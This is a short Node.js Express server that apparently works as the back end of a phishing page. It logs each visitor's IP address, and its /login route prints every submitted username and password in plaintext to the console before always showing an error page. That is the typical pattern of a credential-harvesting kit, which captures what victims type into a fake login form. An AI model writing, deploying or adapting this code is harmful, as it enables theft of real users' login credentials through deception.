const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  console.log(`Page visited by: ${req.ip} at ${new Date().toISOString()}`);
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  console.log(`Username: ${username}, Password: ${password}`);
  res.sendFile(path.join(__dirname, 'error.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
